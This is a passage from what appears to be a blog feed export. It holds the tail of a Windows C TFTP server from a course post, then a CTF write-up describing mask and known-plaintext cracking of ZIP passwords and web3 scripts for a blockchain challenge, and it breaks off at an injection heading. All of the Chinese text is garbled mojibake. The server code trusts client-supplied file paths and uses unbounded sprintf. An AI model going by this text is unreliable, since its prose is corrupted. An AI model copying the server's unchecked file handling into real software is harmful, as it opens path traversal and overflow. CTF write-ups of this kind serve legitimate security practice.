&amp;&amp; retries &lt; BACK_NUM) &#123;</span><br><span class="line">                <span class="comment">// å‘é€æ•°æ®åŒ…</span></span><br><span class="line">                sendto(sock, data_packet, bytes_read + <span class="number">4</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, addr_len);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;å‘é€%huå·æ•°æ®åŒ…&quot;</span>, block_number);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è®¾ç½®è¶…æ—¶é‡ä¼ ï¼ˆæ¯æ¬¡é‡ä¼ éƒ½é‡æ–°è®¾ç½®è¶…æ—¶ï¼‰</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">                tv.tv_sec = TIMEOUT_SECONDS;</span><br><span class="line">                tv.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                fd_set read_fds;</span><br><span class="line">                FD_ZERO(&amp;read_fds);</span><br><span class="line">                FD_SET(sock, &amp;read_fds);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ç­‰å¾…ACKæˆ–è¶…æ—¶</span></span><br><span class="line">                <span class="type">int</span> select_result = select(sock + <span class="number">1</span>, &amp;read_fds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line">                <span class="keyword">if</span> (select_result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// æœ‰æ•°æ®å¯è¯»ï¼Œæ¥æ”¶ACK</span></span><br><span class="line">                    recv_len = recvfrom(sock, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, &amp;addr_len);</span><br><span class="line">                    <span class="keyword">if</span> (recv_len &gt;= <span class="number">4</span> &amp;&amp; ntohs(*(<span class="type">unsigned</span> <span class="type">short</span>*)buffer) == OP_ACK &amp;&amp; ntohs(*(<span class="type">unsigned</span> <span class="type">short</span>*)(buffer + <span class="number">2</span>)) == block_number) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;ï¼Œå·²æ”¶åˆ°%huå·æ•°æ®åŒ…\n&quot;</span>, block_number);</span><br><span class="line">                        ack_received = <span class="number">1</span>;  <span class="comment">// æ”¶åˆ°ACKï¼Œé€€å‡ºé‡ä¼ å¾ªç¯</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;ï¼Œæ”¶åˆ°æ— æ•ˆACKï¼Œé‡æ–°å‘é€%huå·æ•°æ®åŒ…\n&quot;</span>, block_number);</span><br><span class="line">                        retries++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (select_result == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// è¶…æ—¶ï¼Œé‡ä¼ æ•°æ®åŒ…</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;è¶…æ—¶ï¼Œé‡æ–°å‘é€%huå·æ•°æ®åŒ…\n&quot;</span>, block_number);</span><br><span class="line">                    retries++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// selectå‡ºé”™</span></span><br><span class="line">                    perror(<span class="string">&quot;select() error&quot;</span>);</span><br><span class="line">                    fclose(file);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bytes_transferred += bytes_read;  <span class="comment">// ç´¯åŠ å·²ä¼ è¾“çš„å­—èŠ‚æ•°</span></span><br><span class="line">            block_number++;  <span class="comment">// å‘é€ä¸‹ä¸€å—æ•°æ®</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (bytes_read == DATA_SIZE);  <span class="comment">// å¦‚æœæ•°æ®å—å¤§å°ä¸è¶³512å­—èŠ‚ï¼Œè¡¨ç¤ºæ–‡ä»¶å·²ä¼ è¾“å®Œæ¯•</span></span><br><span class="line"></span><br><span class="line">        fclose(file);  <span class="comment">// å…³é—­æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¡ç®—å¹¶æ˜¾ç¤ºä¼ è¾“ååé‡</span></span><br><span class="line">        <span class="type">double</span> time_elapsed = (<span class="type">double</span>)(clock() - start_time) / CLOCKS_PER_SEC;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶ä¸‹è½½æˆåŠŸ,å·²ä¼ è¾“å­—èŠ‚æ•°:%d,ä¼ è¾“æ—¶é—´:%.4lf s,ä¸‹è½½ååé‡:%.2f Bps\n&quot;</span>, bytes_transferred, time_elapsed, bytes_transferred / time_elapsed);</span><br><span class="line">        <span class="built_in">sprintf</span>(log_buf, <span class="string">&quot;Transfer completed for file: %s, Throughput: %.2f Bps&quot;</span>, filename, bytes_transferred / time_elapsed);</span><br><span class="line">        log_message(log_buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (opcode == OP_WRQ) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†å†™è¯·æ±‚ï¼ˆä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼‰</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Handling WRQ: Upload %s in %s mode\n&quot;</span>, filename, mode);</span><br><span class="line">        <span class="built_in">sprintf</span>(log_buf, <span class="string">&quot;Received WRQ for file: %s&quot;</span>, filename);</span><br><span class="line">        log_message(log_buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºè¦å†™å…¥çš„æ–‡ä»¶</span></span><br><span class="line">        FILE* file = fopen(filename, mode[<span class="number">0</span>] == <span class="string">&#x27;o&#x27;</span> ? <span class="string">&quot;wb&quot;</span> : <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ–‡ä»¶æ— æ³•æ‰“å¼€ï¼Œå‘é€è®¿é—®é”™è¯¯</span></span><br><span class="line">            send_error(sock, client_addr, addr_len, ERR_ACCESS_VIOLATION, <span class="string">&quot;Access violation.&quot;</span>);</span><br><span class="line">            log_message(<span class="string">&quot;Error: Access violation.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶æ— æ³•æ‰“å¼€\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> block_number = <span class="number">0</span>;  <span class="comment">// åˆå§‹åŒ–ACKå—ç¼–å·</span></span><br><span class="line">        <span class="type">clock_t</span> start_time = clock();  <span class="comment">// å¼€å§‹è®¡æ—¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¾ªç¯æ¥æ”¶å®¢æˆ·ç«¯ä¸Šä¼ çš„æ•°æ®</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// å‘é€ACKç¡®è®¤åŒ…ï¼ŒACKåŒ…ä¸­åŒ…å«ä¸Šä¸€ä¸ªæ¥æ”¶çš„å—ç¼–å·</span></span><br><span class="line">            <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">            *(<span class="type">unsigned</span> <span class="type">short</span>*)buffer = htons(OP_ACK);  <span class="comment">// æ“ä½œç ï¼šç¡®è®¤åŒ…</span></span><br><span class="line">            *(<span class="type">unsigned</span> <span class="type">short</span>*)(buffer + <span class="number">2</span>) = htons(block_number);  <span class="comment">// ç¡®è®¤çš„å—ç¼–å·</span></span><br><span class="line">            sendto(sock, buffer, <span class="number">4</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, addr_len);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¥æ”¶æ•°æ®åŒ…</span></span><br><span class="line">            recv_len = recvfrom(sock, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, &amp;addr_len);</span><br><span class="line">            <span class="keyword">if</span> (recv_len &lt; <span class="number">4</span> || ntohs(*(<span class="type">unsigned</span> <span class="type">short</span>*)buffer) != OP_DATA) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ”¶åˆ°çš„ä¸æ˜¯æ•°æ®åŒ…ï¼Œå‘é€é”™è¯¯</span></span><br><span class="line">                send_error(sock, client_addr, addr_len, ERR_ILLEGAL_OP, <span class="string">&quot;Illegal TFTP operation.&quot;</span>);</span><br><span class="line">                fclose(file);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;å·²æ”¶åˆ°%huå·æ•°æ®åŒ…\n&quot;</span>, block_number);</span><br><span class="line">            block_number++;  <span class="comment">// å—ç¼–å·é€’å¢</span></span><br><span class="line">            bytes_transferred += recv_len - <span class="number">4</span>;  <span class="comment">// ç´¯åŠ å·²æ¥æ”¶çš„å­—èŠ‚æ•°</span></span><br><span class="line">            fwrite(buffer + <span class="number">4</span>, <span class="number">1</span>, recv_len - <span class="number">4</span>, file);  <span class="comment">// å°†æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        &#125; <span class="keyword">while</span> (recv_len == DATA_SIZE + <span class="number">4</span>);  <span class="comment">// å¦‚æœæ¥æ”¶åˆ°çš„æ•°æ®å—å°äº512å­—èŠ‚ï¼Œåˆ™ä¼ è¾“ç»“æŸ</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        *(<span class="type">unsigned</span> <span class="type">short</span>*)buffer = htons(OP_ACK);  <span class="comment">// æ“ä½œç ï¼šç¡®è®¤åŒ…</span></span><br><span class="line">        *(<span class="type">unsigned</span> <span class="type">short</span>*)(buffer + <span class="number">2</span>) = htons(block_number);  <span class="comment">// ç¡®è®¤çš„å—ç¼–å·</span></span><br><span class="line">        sendto(sock, buffer, <span class="number">4</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)client_addr, addr_len);</span><br><span class="line"></span><br><span class="line">        fclose(file);  <span class="comment">// å…³é—­æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¡ç®—å¹¶æ˜¾ç¤ºä¸Šä¼ ååé‡</span></span><br><span class="line">        <span class="type">double</span> time_elapsed = (<span class="type">double</span>)(clock() - start_time) / CLOCKS_PER_SEC;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ,å·²ä¼ è¾“å­—èŠ‚:%d,ä¼ è¾“æ—¶é—´:%.4lf s,ä¸Šä¼ ååé‡:%.2f Bps\n&quot;</span>, bytes_transferred, time_elapsed, bytes_transferred / time_elapsed);</span><br><span class="line">        <span class="built_in">sprintf</span>(log_buf, <span class="string">&quot;Upload completed for file: %s, Throughput: %.2f Bps&quot;</span>, filename, bytes_transferred / time_elapsed);</span><br><span class="line">        log_message(log_buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¯¹äºæ— æ•ˆçš„æ“ä½œç ï¼Œå‘é€éæ³•æ“ä½œçš„é”™è¯¯åŒ…</span></span><br><span class="line">        send_error(sock, client_addr, addr_len, ERR_ILLEGAL_OP, <span class="string">&quot;Illegal TFTP operation.&quot;</span>);</span><br><span class="line">        log_message(<span class="string">&quot;Error: Illegal TFTP operation.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸»å‡½æ•°ï¼Œè´Ÿè´£åˆå§‹åŒ–æœåŠ¡å™¨å¹¶å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    SOCKET sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ­£åœ¨åˆå§‹åŒ–tftpæœåŠ¡å™¨...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Winsock initialization failed. Error Code: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Winsock initialized.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºUDPå¥—æ¥å­—</span></span><br><span class="line">    <span class="keyword">if</span> ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not create socket: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Socket created.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é…ç½®æœåŠ¡å™¨åœ°å€ç»“æ„</span></span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_addr.s_addr = INADDR_ANY; <span class="comment">// ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£</span></span><br><span class="line">    server_addr.sin_port = htons(PORT);       <span class="comment">// ç»‘å®šåˆ°TFTPé»˜è®¤ç«¯å£69</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»‘å®šå¥—æ¥å­—</span></span><br><span class="line">    <span class="keyword">if</span> (bind(sock, (<span class="keyword">struct</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bind failed with error code: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bind successful. Waiting for clients...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœåŠ¡å™¨ä¸»å¾ªç¯ï¼Œç­‰å¾…å¹¶å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// æ¯æ¬¡æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œå¤„ç†è¯¥è¯·æ±‚</span></span><br><span class="line">        handle_client(sock, &amp;client_addr, addr_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­å¥—æ¥å­—å¹¶æ¸…ç†Winsock</span></span><br><span class="line">    closesocket(sock);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF&#39;s wp</title>
      <link href="/2024/10/01/wp/"/>
      <url>/2024/10/01/wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="è¶…çº§ä¾¦æ¢"><a href="#è¶…çº§ä¾¦æ¢" class="headerlink" title="è¶…çº§ä¾¦æ¢"></a>è¶…çº§ä¾¦æ¢</h3><p>æ ¹æ®é¢˜ç›®æç¤º,<strong>Flagä¸ºæ‹æ‘„ç‚¹èƒŒåçš„åœè½¦åœºç”µè¯,flagæ ¼å¼ä¸ºL3HSEC{}</strong><br><img src="/img/CTF/search-3.png"><br>é€šè¿‡googleæœå›¾ï¼Œå¯¹æ¯”å›¾ç‰‡ä¸­çš„å…³é”®ä¿¡æ¯ï¼ŒæŸ¥æ‰¾åˆ°è¯¥ä½ç½®å¤§æ¦‚ä½äºæ—¥æœ¬æŸåšç‰©é¦†é™„è¿‘<br><img src="/img/CTF/search-4.jpg"><br>å†é€šè¿‡google earthæŸ¥çœ‹è¿‘æ™¯å›¾ï¼Œæ‰¾åˆ°é™„è¿‘åœè½¦åœºçš„ä¿¡æ¯ï¼Œæ‰¾åˆ°flag<br><img src="/img/CTF/search-1.jpg"><br><img src="/img/CTF/search-2.png"></p><h3 id="ft8"><a href="#ft8" class="headerlink" title="ft8"></a>ft8</h3><p>é¢˜ç›®ç»™å‡ºä¸€æ®µå¾ªç¯æ’­æ”¾çš„éŸ³é¢‘ï¼ŒçŒœæµ‹æ˜¯éŸ³é¢‘å†…å®¹ä¸­éšè—ä¿¡æ¯<br>æ ¹æ®é¢˜ç›®<strong>WebSDR - FT8</strong>,æœç´¢tf8äº†è§£åˆ°</p><blockquote><p>FT8æ˜¯ä¸€ç§ä¸“ä¸ºä¸šä½™æ— çº¿ç”µå°ä¹‹é—´è¿›è¡Œå¿«é€Ÿã€å‡†ç¡®é€šä¿¡è€Œè®¾è®¡çš„æ•°å­—åè®®ï¼Œå°¤å…¶åœ¨å¼±ä¿¡å·æ¡ä»¶ä¸‹è¡¨ç°å‡ºè‰²ã€‚FT8åè®®åªå ç”¨50Hzçš„å¸¦å®½ï¼Œå¯ä»¥è§£ç äººè€³éš¾ä»¥è¾¨åˆ«çš„å¾®å¼±ä¿¡å·ã€‚å³ä½¿åœ¨é«˜æ¥¼æ—ç«‹çš„ç¤¾åŒºï¼Œä½¿ç”¨æ™®é€šçš„æ‰‹æŒå¤©çº¿ä¹Ÿå¯ä»¥ä¸æ¬§æ´²ç­‰åœ°è¿›è¡Œé€šä¿¡ã€‚</p></blockquote><p><img src="/img/CTF/ft8-1.png"></p><p>å†æŸ¥è¯¢ft8è§£ç çš„å·¥å…·ï¼Œä½¿ç”¨<strong>jtdx</strong>è¿›è¡Œè§£ç ï¼Œå¾—åˆ°flag<br><img src="/img/CTF/ft8-2.jpg"></p><h3 id="ZipZip"><a href="#ZipZip" class="headerlink" title="ZipZip"></a>ZipZip</h3><p>é€šè¿‡WinRARè§£å‹æ—¶å‘ç°æç¤ºä¿¡æ¯<strong>L3HSEC??????L3HSEC</strong>,çŒœæµ‹å¯èƒ½ä¸ºè§£ç çš„å£ä»¤<br><img src="/img/CTF/zipzip-1.png"><br>ä½¿ç”¨<strong>achpr</strong>å·¥å…·å°è¯•å¼ºè¡Œçˆ†ç ´å¤±è´¥åï¼Œåˆ©ç”¨<strong>L3HSEC??????L3HSEC</strong>ä½œä¸ºæ©ç è¿›è¡Œæ©ç æ”»å‡»ï¼Œ<br>æœ€ååœ¨èŒƒå›´ä¸ºï¼ˆ0-9ï¼‰ä¹‹é—´æ—¶æˆåŠŸæ¢å¤å£ä»¤<br><img src="/img/CTF/zipzip-2.png"><br>åˆ©ç”¨å£ä»¤æ‰“å¼€ZipZipå‹ç¼©åŒ…ï¼Œé‡Œé¢åŒ…å«gift.zipå’Œsecret.zipä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œä¸”éƒ½éœ€è¦å¯†é’¥æ‰èƒ½è§£å¼€<br>è§‚å¯Ÿåˆ°ä¸¤ä¸ªå‹ç¼©åŒ…å†…å®¹ç›¸ä¼¼ï¼Œä¸”secret.zipå†…å¤šä¸€ä¸ªsecret.txtæ–‡ä»¶ï¼ŒçŒœæµ‹flagè—äºå…¶ä¸­<br>å†æ¬¡å°è¯•å¼ºè¡Œçˆ†ç ´secret.zipå¤±è´¥åï¼Œè€ƒè™‘åˆ°gift.zipå¯èƒ½æœ‰æœ‰ç”¨ä¿¡æ¯ï¼Œäºæ˜¯å¯¹gitf.zipé‡‡ç”¨æ˜æ–‡æ”»å‡»ï¼Œæœ€ç»ˆå¾—åˆ°å£ä»¤ï¼ŒæˆåŠŸæ‰“å¼€secret.zipå‹ç¼©åŒ…<br><img src="/img/CTF/zipzip-3.png"><br>è§‚å¯Ÿsecret.txtæ–‡ä»¶çŒœæµ‹ä¸ºJSFuckç¼–ç <br><img src="/img/CTF/zipzip-4.png"><br>ä½¿ç”¨åœ¨çº¿å·¥å…·è¿›è¡ŒJSFuckè§£ç ï¼Œè§‚å¯Ÿè§£ç çŒœæµ‹ä¸ºæ‘©æ–¯å¯†ç <br><img src="/img/CTF/zipzip-6.png"><br>ä½¿ç”¨åœ¨çº¿å·¥å…·è¿›è¡Œæ‘©æ–¯å¯†ç è§£ç åå¾—åˆ°ä¸flag<strong>é«˜åº¦ç›¸ä¼¼</strong>çš„å­—ç¬¦ä¸²<br><img src="/img/CTF/zipzip-5.png"><br>æœ€åçŒœæµ‹ flagä¸º<strong>L3HSEC{WOW_U@RE_FUCKING_SM4RT!}</strong></p><h3 id="ä½ çŸ¥é“Blockchainå˜›"><a href="#ä½ çŸ¥é“Blockchainå˜›" class="headerlink" title="ä½ çŸ¥é“Blockchainå˜›?"></a>ä½ çŸ¥é“Blockchainå˜›?</h3><p>æœç´¢å…³é”®è¯Blockchainå¾—åˆ°è¿™æ˜¯ä¸€é“åŒºå—é“¾çš„é¢˜ç›®ï¼Œå‚è€ƒ<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">bilibili</a>ä¸Šç›¸å…³è§†é¢‘</p><ol><li><p>ncat 119.8.106.225 20000è¿æ¥æœåŠ¡å™¨<br><img src="/img/CTF/blockchain-1.png"><br>æ ¹æ®é€‰é¡¹æç¤ºåšå‡ºå†³ç­–<br>é¦–å…ˆé€‰æ‹©1ï¼Œé¢˜ç›®ä¼šç»™å‡ºéƒ¨ç½²è´¦æˆ·(deployer account)å’Œæ ‡å¿—èº«ä»½çš„ä¿¡æ¯(token),è¦æ±‚å‘è¯¥è´¦æˆ·è½¬å…¥0.001æµ‹è¯•å¸</p></li><li><p>è¿æ¥ä»¥å¤ªåŠç»“ç‚¹ï¼Œåˆå§‹åŒ–è´¦æˆ·ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªæ–°çš„è´¦æˆ·</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># æ‰“å°è´¦æˆ·åœ°å€ã€ç§é’¥å’Œå…¬é’¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åœ°å€: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ç§é’¥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/blockchain-2.png"></p></li><li><p>ä½¿ç”¨ç”Ÿæˆçš„åœ°å€åœ¨é¢˜ç›®æä¾›çš„<strong>æ°´é¾™å¤´</strong>é¢†å–æµ‹è¯•å¸<br><img src="/img/CTF/blockchain-3.png"></p></li><li><p>å°†è‡ªå·±è´¦æˆ·çš„æµ‹è¯•å¸è½¬ç§»ä¸€éƒ¨åˆ†åˆ°éƒ¨ç½²è´¦æˆ·å®Œæˆäº¤æ˜“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›è¡Œäº¤æ˜“</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ° RPC åœ°å€</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½ çš„æµ‹è¯•é’±åŒ…åœ°å€å’Œç§é’¥</span></span><br><span class="line">eth_address = <span class="string">&quot;0xd506f9E66bD092248Ea48c3709f4Db9A57AFF67e&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;e899bd263df411b26cff19aec59d4df1b050d47a231c2e774b090142b6076b9c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡éƒ¨ç½²è´¦æˆ·ï¼ˆdeployer accountï¼‰</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x6870802A4a17D1D88Dd825ED40f95bb1C9e9D33C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–é“¾ ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºäº¤æ˜“</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># æ·»åŠ é“¾ ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç§é’¥ç­¾åäº¤æ˜“</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€äº¤æ˜“</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;äº¤æ˜“å·²å‘é€ï¼Œäº¤æ˜“å“ˆå¸Œ: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…äº¤æ˜“ç¡®è®¤</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;äº¤æ˜“æˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/blockchain-4.png"></p></li><li><p>è¿”å›å‘½ä»¤è¡Œï¼Œè¾“å…¥2ï¼Œå¾—åˆ°åˆçº¦åœ°å€<br><img src="/img/CTF/blockchain-5.png"></p></li><li><p>é€‰æ‹©4ï¼ŒæŸ¥çœ‹<strong>contract source code</strong> ï¼Œé€šè¿‡pythonè„šæœ¬å‘åˆçº¦åœ°å€å‘èµ·æ”»å‡»<br><img src="/img/CTF/blockchain-7.png"><br><img src="/img/CTF/blockchain-6.png"><br>æ”»å‡»æˆåŠŸï¼Œæœ€ååœ¨å‘½ä»¤è¡Œå¾—åˆ°flag</p></li></ol><h3 id="ä»€ä¹ˆ-æ³¨å…¥-çœŸçš„å‡çš„"><a href="#ä»€ä¹ˆ-æ³¨å…¥-çœŸçš„å‡çš„" class="headerlink" 